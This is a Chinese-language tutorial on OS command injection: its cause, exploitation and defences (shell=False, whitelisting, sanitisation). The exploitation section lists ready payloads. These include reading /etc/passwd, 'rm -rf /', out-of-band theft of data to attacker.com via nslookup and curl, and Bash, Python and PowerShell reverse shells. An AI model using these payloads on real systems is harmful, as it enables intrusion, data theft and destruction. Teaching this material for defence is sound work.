1. 命令注入原理

1.1 什么是命令注入

命令注入（Command Injection / OS Command Injection）是攻击者通过应用程序将恶意操作系统命令注入到宿主系统中执行的一种攻击方式。

1.2 漏洞成因

应用程序将用户输入直接或间接拼接到系统命令中执行：

# 危险代码
import os
domain = request.form['domain']
result = os.system(f"ping -c 3 {domain}")

攻击者输入 8.8.8.8; cat /etc/passwd，实际执行：

ping -c 3 8.8.8.8; cat /etc/passwd

1.3 与代码注入的区别

对比项 命令注入 代码注入
注入内容 操作系统命令 编程语言代码
执行环境 操作系统 Shell 应用程序运行时
示例 ; rm -rf / __import__('os').system('id')

2. 命令注入利用

2.1 命令连接符

连接符 Shell 含义
; Bash/Windows 顺序执行
&& Bash/Windows 前命令成功后执行
|| Bash/Windows 前命令失败后执行
| Bash/Windows 管道
` Bash 命令替换
$() Bash 命令替换
& Bash/Windows 后台执行
\n Bash 换行执行

2.2 盲注技术

当应用不返回命令输出时：

时间盲注： 

# Linux
; sleep 5

# Windows
& timeout 5

带外数据：

# DNS 带外
; nslookup $(whoami).attacker.com

# HTTP 带外
; curl http://attacker.com/$(cat /etc/passwd | base64)

# ICMP 带外
; ping -c 1 attacker.com -p $(echo "data" | xxd -p)

2.3 文件读写

# 读取文件
; cat /etc/passwd
; type C:\Windows\win.ini

# 写入文件
; echo "malicious" > /tmp/shell.sh
; echo "malicious" > C:\temp\shell.bat

2.4 反弹 Shell

# Bash 反弹 Shell
; bash -i >& /dev/tcp/attacker.com/4444 0>&1

# Python 反弹 Shell
; python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# PowerShell 反弹 Shell
; powershell -e <base64_encoded_reverse_shell>

3. 命令注入防御

3.1 避免调用系统命令

# 危险：调用系统命令
os.system(f"ping {domain}")

# 安全：使用库函数
import subprocess
result = subprocess.run(["ping", "-c", "3", domain], capture_output=True, text=True)

3.2 输入验证与白名单

import re

# 域名白名单验证
def validate_domain(domain):
    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9.-]{1,253}[a-zA-Z0-9]$', domain):
        raise ValueError("Invalid domain")
    return domain

# IP 地址验证
def validate_ip(ip):
    import ipaddress
    try:
        ipaddress.ip_address(ip)
        return ip
    except ValueError:
        raise ValueError("Invalid IP address")

3.3 参数化命令调用

# 危险：Shell 拼接
os.system(f"convert {input_file} {output_file}")

# 安全：参数列表
subprocess.run(["convert", input_file, output_file], shell=False)

关键：shell=False 是最重要的防御措施，避免通过 Shell 解释器执行。

3.4 输入净化

# 移除危险字符
def sanitize_input(user_input):
    dangerous_chars = [';', '&', '|', '`', '$', '(', ')', '<', '>', '\n', '\r']
    for char in dangerous_chars:
        user_input = user_input.replace(char, '')
    return user_input

注意：净化不如白名单验证可靠，应作为辅助手段。

3.5 沙箱与权限控制

策略 描述
最小权限 应用以低权限用户运行
